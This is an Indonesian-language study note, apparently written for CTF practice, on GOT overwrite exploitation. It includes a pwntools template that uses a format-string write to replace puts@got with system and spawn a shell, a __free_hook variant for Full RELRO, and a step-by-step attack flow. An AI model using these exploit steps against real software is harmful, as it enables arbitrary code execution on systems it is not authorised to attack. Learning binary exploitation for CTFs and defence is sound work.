#cybersecurity

GOT overwrite adalah teknik mengubah isi `fungsi@got` menjadi alamat fungsi lain (biasanya `system`), sehingga panggilan fungsi yang sah berubah menjadi eksekusi yang kita inginkan.

## Ide

```c
// program asli
printf(user_input);     // RENTAN: format string!
puts(user_input);       // panggilan lain yang memakai puts
```

Kalau kita ubah `puts@got = system`:

```text
puts(user_input)  ->  system(user_input)
```

Maka kirim `"/bin/sh"` → `system("/bin/sh")` → shell!

## Syarat

1. **Partial RELRO** (GOT writable) - cek `checksec` (lihat [[RELRO]])
2. Ada cara **menulis** ke memory: format string `%n` (paling umum) atau overflow
3. Tahu alamat `puts@got` (dari `elf.got`) dan alamat `system` (dari leak libc)

## Cara 1: format string + fmtstr_payload

```python
from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./chall")

# ... leak libc dulu (lihat Format String Read / Ret2libc) ...

# timpa puts@got dengan system
payload = fmtstr_payload(pos, {elf.got.puts: libc.sym.system})
io.sendline(payload)

# trigger: kirim "/bin/sh" ke fungsi yang memanggil puts
io.sendline(b"/bin/sh")
io.interactive()
```

## Cara 2: overflow + ROP (tanpa format string)

Kalau ada overflow dan kita bisa menulis sebarang bytes ke GOT... jarang langsung; umumnya format string lebih praktis.

## Memilih target GOT

Fungsi yang paling sering di-overwrite:

| Fungsi | Alasan |
|---|---|
| `puts` | Sering dipanggil dengan input user |
| `printf` | Sering dipanggil dengan input user |
| `strcpy`/`gets` | Sering dipanggil dengan input user |
| `free` | `free(x)` → `system(x)` (dipakai juga di heap) |
| `__free_hook` | Hook libc - free → system |

Pilih fungsi yang **sering dipanggil dengan data yang kita kontrol** setelah overwrite.

## Alternatif jika Full RELRO

- GOT tidak bisa ditulis → pakai **hook libc**: `__free_hook`, `__malloc_hook` (glibc < 2.34):

```python
# __free_hook writable walau Full RELRO
free_hook = libc.sym["__free_hook"]
payload = fmtstr_payload(pos, {free_hook: libc.sym.system})
# lalu free(ptr_berisi "/bin/sh") -> system("/bin/sh")
```

- Atau langsung ret2libc ([[Ret2libc]]) - tidak butuh GOT.

## Alur lengkap khas

```
1. checksec -> Partial RELRO? 
2. Leak libc (format string / puts@got)
3. system = libc.address + offset_system
4. fmtstr_payload(pos, {elf.got.puts: system})
5. Kirim payload -> GOT puts sekarang system
6. Kirim "/bin/sh" ke panggilan puts -> system("/bin/sh") -> shell
```

## Catatan

1. `fmtstr_payload` menulis banyak byte - pastikan panjang payload tidak melebihi buffer program.
2. Kalau program memanggil fungsi yang kita overwrite **sebelum** kita sempat trigger, crash - pilih waktu trigger yang tepat.
3. Setelah GOT di-overwrite, fungsi asli tidak bisa dipakai lagi - jangan panggil `puts` untuk hal lain.
4. Materi terkait: [[Format String Write (GOT Overwrite)]], [[RELRO]], [[Ret2libc]].
